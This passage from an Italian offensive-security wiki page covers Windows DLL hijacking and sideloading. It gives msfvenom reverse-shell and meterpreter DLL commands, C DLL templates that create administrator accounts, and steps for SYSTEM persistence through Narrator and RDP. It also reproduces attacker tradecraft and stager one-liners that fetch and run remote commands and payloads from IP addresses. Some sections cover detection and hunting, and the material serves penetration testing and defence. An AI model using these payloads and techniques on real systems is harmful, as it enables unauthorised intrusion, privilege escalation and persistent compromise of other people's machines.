for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Puoi anche controllare le importazioni di un eseguibile e le esportazioni di una DLL con:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Per una guida completa su come **abusare del DLL Hijacking per aumentare i privilegi** disponendo dei permessi di scrittura in una **cartella System Path**, consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatizzati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verifica se disponi dei permessi di scrittura in una qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatizzati interessanti per individuare questa vulnerabilità sono le funzioni **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Se trovi uno scenario sfruttabile, una delle cose più importanti per riuscire a sfruttarlo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. In ogni caso, tieni presente che il DLL Hijacking è utile per [passare dal livello di integrità Medium a High **(aggirando UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** in questo studio sul DLL Hijacking, incentrato sul DLL hijacking per l'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** trovi alcuni **codici dll di base**, utili come **modelli** o per creare una **dll con funzioni non obbligatorie esportate**.

## **Creazione e compilazione di DLL**

### **DLL Proxifying**

In sostanza, una **DLL proxy** è una DLL in grado di **eseguire il tuo codice malevolo quando viene caricata**, ma anche di **esporre** e **funzionare** come **previsto**, **inoltrando tutte le chiamate alla libreria reale**.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi **indicare un eseguibile e selezionare la libreria** di cui vuoi creare un proxy e **generare una dll proxy**, oppure **indicare la DLL** e **generare una dll proxy**.

### **Meterpreter**

**Ottieni una rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Ottieni un meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Crea un utente (non ho trovato una versione x64 per x86):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Una tua

In molti casi, la DLL compilata deve **esportare ogni funzione importata dal processo vittima**. Se manca un'esportazione necessaria, il binario non può risolverla e l'exploit fallisce.

<details>
<summary>C DLL template (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Esempio di DLL C++ con creazione di utenti</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL C alternativa con punto di ingresso del thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### DLL NativeAOT con inizializzazione attivata dall'esportazione

Una **libreria condivisa .NET NativeAOT self-contained** può essere usata come DLL nativa posizionata senza implementare un `DllMain` esplicito. Esportate metodi C# statici con `[UnmanagedCallersOnly(EntryPoint = "...")]`; quando l'host nativo chiama uno di questi punti di ingresso generati dal compilatore, NativeAOT inizializza il modulo e un metodo `[ModuleInitializer]` viene eseguito prima del corpo C# esportato. L'output non richiede un runtime .NET installato separatamente.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

La DLL deve comunque avere i **nomi di esportazione e le firme compatibili con l'ABI** effettivamente chiamati dall'host selezionato. Gli stub minimi possono bastare per attivare l'inizializzazione, ma le esportazioni mancanti possono impedire il caricamento e una firma errata può corrompere la chiamata. Elencate gli import dell'host e convalidate il risultato con `dumpbin /exports payload.dll` prima di rinominare l'output con il nome della dipendenza atteso dall'host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>DLL esportata NativeAOT minima</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Configura il progetto come libreria condivisa nativa di Windows autonoma:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Posiziona la DLL rinominata accanto all’eseguibile vulnerabile copiato e avvia l’host tramite il percorso di codice che chiama l’export compatibile. Questo approccio con initializer evita di inserire operazioni complesse direttamente in `DllMain`, ma i prerequisiti del sideloading restano invariati: il loader deve risolvere la dipendenza in base al nome, selezionare la directory dell’applicazione e non trovarla prima in KnownDLLs, tra i moduli già caricati, tramite redirezione SxS o usando flag `LOAD_LIBRARY_SEARCH_*` restrittivi.<sup>[[26]](#references)[[30]](#references)</sup>

Per i template nativi convenzionali, vedi [Windows C payloads](../windows-c-payloads.md). Un first stage caricato tramite sideloading può successivamente eseguire [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), ma si tratta di una tecnica di injection distinta, non parte della risoluzione delle DLL.

## Rilevamento: caricamenti di librerie tramite DLL masquerading

Elastic Defend 9.5.0 arricchisce un evento di caricamento di una libreria con `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` quando il file caricato non è firmato da Microsoft e il suo nome coincide con quello di una DLL Windows/di sistema presente nell’inventario memorizzato nella cache di Elastic. In questo modo, l’analisi dell’inventario dei nomi file, della posizione di sistema e della firma viene eseguita dal sensore dell’endpoint; l’EQL di base può quindi essere ridotto a:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Considera l'arricchimento un pivot di alto valore, non una prova di per sé. Aumenta il livello di confidenza quando un host firmato carica la DLL dalla propria directory **scrivibile dall'utente**, la DLL è non firmata/non attendibile e `dll.Ext.relative_file_creation_time` indica che è stata creata poco prima del caricamento. Limita le esclusioni alla combinazione esatta di publisher + processo host + percorso di installazione; non escludere globalmente un nome di DLL che collida, perché programmi di installazione e applicazioni legittimi possono distribuire librerie private con nomi simili a quelli di sistema.<sup>[[26]](#references)</sup>

Nei sensori privi di questo arricchimento, approssima il comportamento correlando un nome di DLL che collida con un percorso di caricamento non di sistema, una firma Microsoft assente/non attendibile e un breve intervallo tra la creazione del file e il caricamento. Ciò richiede un inventario dei nomi delle DLL mantenuto aggiornato e un elenco ristretto di esclusioni per `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` e altri percorsi di distribuzione approvati.<sup>[[26]](#references)</sup>

## Caso di studio: DLL Hijack della DLL di localizzazione TTS OneCore di Narrator (accessibilità/AT)

All'avvio, Windows Narrator.exe cerca ancora una DLL di localizzazione prevedibile e specifica per la lingua, che può essere dirottata per eseguire codice arbitrario e ottenere persistenza.<sup>[[7]](#references)</sup>

Fatti principali
- Percorso di ricerca (build attuali): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se nel percorso OneCore è presente una DLL scrivibile e controllata da un attaccante, questa viene caricata ed esegue `DllMain(DLL_PROCESS_ATTACH)`. Non sono richieste esportazioni.

Individuazione con Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` oppure `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso indicato sopra.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC silenziosa
- Un hijack ingenuo farà parlare/evidenziare la UI. Per non farsi notare, all'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e sospendilo con `SuspendThread`; continua nel tuo thread. Vedi il PoC per il codice completo.<sup>[[8]](#references)</sup>

Trigger e persistenza tramite configurazione di Accessibility
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviando Narrator viene caricata la DLL inserita. Sul desktop sicuro (schermata di accesso), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul desktop sicuro.

Esecuzione SYSTEM attivata tramite RDP (movimento laterale)
- Consenti il livello di sicurezza RDP classico: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connettiti all'host tramite RDP e, nella schermata di accesso, premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul desktop sicuro.
- L'esecuzione si interrompe quando la sessione RDP viene chiusa: esegui l'inject/migrate tempestivamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce del Registro di sistema di uno strumento di Accessibility integrato (AT), ad esempio CursorIndicator, modificarla in modo che punti a un binario/DLL arbitrario, importarla e poi impostare `configuration` sul nome di quell'AT. In questo modo, l'esecuzione arbitraria viene eseguita tramite il framework Accessibility.

Note
- Per scrivere in `%windir%\System32` e modificare i valori HKLM sono necessari i diritti di amministratore.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessari export.

## Caso di studio: CVE-2025-1729 - Escalation dei privilegi tramite TPQMAssistant.exe

Questo caso dimostra la tecnica **Phantom DLL Hijacking** nel TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), identificata come **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe`, situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Attività pianificata**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguita ogni giorno alle 9:30 con il contesto dell'utente connesso.
- **Autorizzazioni della directory**: scrivibile da `CREATOR OWNER`, consentendo agli utenti locali di inserire file arbitrari.
- **Comportamento di ricerca delle DLL**: tenta prima di caricare `hostfxr.dll` dalla propria directory di lavoro e registra "NAME NOT FOUND" se il file è assente, indicando che la ricerca nella directory locale ha la precedenza.

### Implementazione dell'exploit

Un attaccante può inserire uno stub malevolo di `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere l'esecuzione di codice nel contesto dell'utente:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Flusso dell'attacco

1. Come utente standard, copia `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che l'attività pianificata venga eseguita alle 9:30 nel contesto dell'utente corrente.
3. Se al momento dell'esecuzione dell'attività è connesso un amministratore, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità media.
4. Combina le tecniche standard di bypass UAC per ottenere privilegi SYSTEM partendo dall'integrità media.

## Caso di studio: dropper MSI CustomAction + DLL Side-Loading tramite un host firmato (wsc_proxy.exe)

Gli attori delle minacce spesso combinano i dropper basati su MSI con il DLL Side-Loading per eseguire payload all'interno di un processo firmato e affidabile.<sup>[[10]](#references)</sup>

Panoramica della catena
- L'utente scarica l'MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione tramite GUI (ad es., un'azione LaunchApplication o VBScript) e ricostruisce la fase successiva a partire da risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (coppia di esempio: wsc_proxy.exe firmato da Avast + wsc.dll controllato dall'attaccante).
- All'avvio dell'EXE firmato, l'ordine di ricerca delle DLL di Windows carica prima wsc.dll dalla directory di lavoro, eseguendo il codice dell'attaccante all'interno di un processo padre firmato (ATT&CK T1574.001).

Analisi dell'MSI (cosa cercare)
- Tabella CustomAction:
  - Cerca voci che eseguono eseguibili o VBScript. Esempio di schema sospetto: LaunchApplication che esegue un file incorporato in background.
  - In Orca (Microsoft Orca.exe), esamina le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload incorporati/divisi nell'MSI CAB:
  - Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Oppure usa lessmsi: lessmsi x package.msi C:\out
  - Cerca più frammenti di piccole dimensioni che vengono concatenati e decrittati da una CustomAction VBScript. Flusso comune:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Sideloading pratico con wsc_proxy.exe
- Metti questi due file nella stessa cartella:
  - wsc_proxy.exe: host legittimo firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla propria directory.
  - wsc.dll: DLL dell’attaccante. Se non sono richiesti export specifici, può bastare DllMain; altrimenti, crea una DLL proxy e inoltra gli export richiesti alla libreria originale, eseguendo il payload in DllMain.
- Crea un payload DLL minimale:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Per i requisiti di export, usa un framework di proxying (ad esempio DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione dei nomi delle DLL da parte del binario host. Se l’host usa percorsi assoluti o flag di caricamento sicuro (ad esempio LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l’hijack potrebbe non riuscire.
- KnownDLLs, SxS ed export inoltrati possono influenzare la precedenza e vanno considerati nella scelta del binario host e del set di export.

## Triadi firmate + payload crittografati (case study ShadowPad)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per confondersi con software legittimo e mantenere il payload principale crittografato su disco:<sup>[[12]](#references)</sup>

1. **EXE host firmato** – vengono abusati vendor come AMD, Realtek o NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attaccanti rinominano l’eseguibile per farlo sembrare un binario Windows (ad esempio `conhost.exe`), ma la firma Authenticode rimane valida.
2. **DLL loader malevola** – viene depositata accanto all’EXE con un nome previsto (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è solitamente un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è individuare il blob crittografato, decrittarlo e mappare ShadowPad in modo riflessivo.
3. **Blob del payload crittografato** – spesso salvato come `<name>.tmp` nella stessa directory. Dopo aver mappato in memoria il payload decrittato, il loader elimina il file TMP per distruggere le prove forensi.

Note sulle tradecraft:

* Rinominare l’EXE firmato (mantenendo `OriginalFileName` originale nell’header PE) gli permette di spacciarsi per un binario Windows conservando la firma del vendor. Per replicare l’abitudine di Ink Dragon, deposita binari dall’aspetto simile a `conhost.exe` che in realtà sono utility AMD/NVIDIA.
* Poiché l’eseguibile rimane attendibile, per la maggior parte dei controlli di allowlisting è sufficiente che la DLL malevola si trovi accanto. Concentrati sulla personalizzazione della DLL loader; in genere il parent firmato può essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP si trovi accanto al loader e sia scrivibile, così da poter azzerare il file dopo il mapping. Mantieni la directory scrivibile finché il payload non viene caricato; una volta in memoria, il file TMP può essere eliminato in sicurezza per OPSEC.

### Catena di DLL sideloading con stager LOLBAS e archive sideloading a fasi (finger → tar/curl → WMI)

Gli operatori combinano il DLL sideloading con LOLBAS, così che l’unico artefatto personalizzato su disco sia la DLL malevola accanto all’EXE attendibile:<sup>[[1]](#references)</sup>

- **Loader di comandi remoti (Finger):** PowerShell nascosto avvia `cmd.exe /c`, recupera comandi da un server Finger e li invia tramite pipe a `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` recupera il testo TCP/79; `| cmd` esegue la risposta del server, consentendo agli operatori di ruotare il second stage lato server.

- **Download/estrazione integrati:** scaricare un archivio con un’estensione innocua, decomprimerlo e predisporre il target di sideload e la DLL in una cartella `%LocalAppData%` casuale:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` nasconde l'avanzamento e segue i redirect; `tar -xf` usa tar integrato in Windows.

- **Avvio tramite WMI/CIM:** Avvia l'EXE tramite WMI, in modo che la telemetria mostri un processo creato da CIM mentre carica la DLL presente nella stessa directory:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Funziona con i binari che preferiscono DLL locali (ad es. `intelbq.exe`, `nearby_share.exe`); il payload (ad es. Remcos) viene eseguito con il nome attendibile.

- **Hunting:** genera un alert su `forfiles` quando `/p`, `/m` e `/c` compaiono insieme; è raro al di fuori degli script di amministrazione.


## Studio del caso: dropper NSIS + sideload del Bitdefender Submission Wizard (Chrysalis)

Una recente intrusione di Lotus Blossom ha abusato di una catena di aggiornamento attendibile per distribuire un dropper impacchettato con NSIS, che ha predisposto un sideload di DLL e payload interamente in memoria.<sup>[[13]](#references)</sup>

Flusso operativo
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo contrassegna come **HIDDEN**, rilascia un Bitdefender Submission Wizard rinominato (`BluetoothService.exe`), una DLL malevola (`log.dll`) e un blob cifrato (`BluetoothService`), quindi avvia l'EXE.
- L'EXE host importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` carica il blob tramite mmap; `LogWrite` lo decifra usando uno stream personalizzato basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, materiale della chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in chiaro, libera i dati temporanei e vi salta.
- Per evitare una IAT, il loader risolve le API calcolando l'hash dei nomi degli export con **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, quindi applica un avalanche in stile Murmur (**0x85EBCA6B**) e confronta il risultato con gli hash target salati.

Shellcode principale (Chrysalis)
- Decifra un modulo principale simile a un PE ripetendo add/XOR/sub con la chiave `gQ2JR&9;` per cinque passaggi, quindi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione degli import.
- Ricostruisce le stringhe dei nomi delle DLL a runtime tramite trasformazioni di rotazione di bit/XOR per carattere, quindi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che scorre **PEB → InMemoryOrderModuleList**, analizza ogni tabella degli export in blocchi da 4 byte con un mixing in stile Murmur e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Configurazione incorporata e C2
- La configurazione si trova nel file `BluetoothService` rilasciato, all'**offset 0x30808** (dimensione **0x980**), ed è decifrata con RC4 usando la chiave `qwhvb^435h&*7`, rivelando l'URL C2 e lo User-Agent.
- I beacon creano un profilo host delimitato da punti, antepongono il tag `4Q`, quindi lo cifrano con RC4 usando la chiave `vAuig34%^325hGV` prima di chiamare `HttpSendRequestA` su HTTPS. Le risposte vengono decifrate con RC4 e instradate tramite uno switch sui tag (`4T` shell, `4V` esecuzione di processi, `4W/4X` scrittura di file, `4Y` lettura/esfiltrazione, `4\\` disinstallazione, `4` enumerazione di unità/file + casi di trasferimento a blocchi).
- La modalità di esecuzione è controllata dagli argomenti CLI: nessun argomento = installa la persistenza (servizio/chiave Run) con destinazione `-i`; `-i` riavvia il processo con `-k`; `-k` salta l'installazione ed esegue il payload.

Loader alternativo osservato
- La stessa intrusione ha rilasciato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` nella stessa directory. Il sorgente C fornito dall'attaccante incorporava shellcode, lo compilava e lo eseguiva in memoria senza scrivere un PE su disco. Riproduci con:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Questa fase di compilazione ed esecuzione basata su TCC ha importato `Wininet.dll` a runtime e scaricato un payload shellcode di secondo stadio da un URL hardcoded, fornendo un loader flessibile che si maschera da esecuzione di un compilatore.

## Sideloading di host firmati con export proxying + host thread parking

Alcune catene di DLL sideloading aggiungono **interventi per garantire la stabilità**, così che l'host legittimo rimanga attivo abbastanza a lungo da caricare correttamente gli stadi successivi, invece di andare in crash dopo il caricamento della DLL malevola.<sup>[[11]](#references)</sup>

Schema osservato
- Copiare un EXE attendibile accanto a una DLL malevola che usa il nome della dipendenza previsto, ad esempio `version.dll`.
- La DLL malevola **fa da proxy per ogni export previsto**, inoltrandolo alla DLL di sistema reale (ad esempio `%SystemRoot%\\System32\\version.dll`), così che la risoluzione degli import riesca e il processo host continui a funzionare.
- Dopo il caricamento, la DLL **applica una patch all'entry point dell'host**, in modo che il thread principale entri in un ciclo infinito di `Sleep` invece di terminare o eseguire percorsi di codice che chiuderebbero il processo.
- Un nuovo thread esegue le operazioni malevole effettive: decifra il nome o il percorso della DLL di secondo stadio (RC4/XOR sono comuni), quindi la avvia con `LoadLibrary`.

Perché è importante
- Il normale proxying delle DLL preserva la compatibilità delle API, ma non garantisce che l'host rimanga attivo abbastanza a lungo per gli stadi successivi.
- Mettere il thread principale in attesa con `Sleep(INFINITE)` è un modo semplice per mantenere residente il processo firmato mentre il loader esegue la decifratura, la preparazione dello stadio o l'inizializzazione della rete in un thread worker.
- Cercare solo una `DllMain` sospetta può non rilevare questo schema se il comportamento interessante si verifica dopo l'applicazione della patch all'entry point dell'host e l'avvio di un thread secondario.

Flusso di lavoro minimo
1. Copiare l'EXE host firmato e determinare quale DLL carica dalla directory locale.
2. Creare una DLL proxy che esporti le stesse funzioni e le inoltri alla DLL legittima.
3. In `DllMain(DLL_PROCESS_ATTACH)`, creare un thread worker.
4. Da quel thread, applicare una patch all'entry point dell'host o alla routine di avvio del thread principale, in modo che entri in un ciclo con `Sleep`.
5. Decifrare il nome/la configurazione della DLL di secondo stadio e chiamare `LoadLibrary` oppure mappare manualmente il payload.

Indicatori difensivi
- Processi firmati che caricano `version.dll` o librerie comuni simili dalla propria directory dell'applicazione invece che da `System32`.
- Patch in memoria all'entry point del processo poco dopo il caricamento dell'immagine, in particolare salti/chiamate reindirizzati a `Sleep`/`SleepEx`.
- Thread creati da una DLL proxy che chiamano subito `LoadLibrary` su una seconda DLL con un nome decifrato.
- DLL proxy con tutti gli export, posizionate accanto a eseguibili di vendor in directory di staging scrivibili come `ProgramData`, `%TEMP%` o percorsi di archivi estratti.

## References

- [1] [Red Canary – Approfondimenti di intelligence: gennaio 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Escalation dei privilegi tramite TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking in Windows. Esempio semplice in C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore distribuisce nuovo malware che prende di mira l'Europa](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: quando i DLL hijack incontrano gli strumenti di Windows](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Doppelgänger digitali: anatomia delle campagne di impersonificazione in evoluzione che distribuiscono Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Interessi convergenti: analisi dei cluster di minacce che prendono di mira un governo del Sud-est asiatico](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Dentro Ink Dragon: la rete di relay e il funzionamento interno di un'operazione offensiva furtiva](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – La backdoor Chrysalis: un'analisi approfondita del toolkit di Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: catena ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Monitoraggio delle campagne di spionaggio del 2026 di Screening Serpens, APT iraniano](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Elemento `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Elemento `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Elemento `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Elemento `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Elemento `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Elemento `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: le operazioni di Nimbus Manticore durante il conflitto iraniano](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Azioni delle attività](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
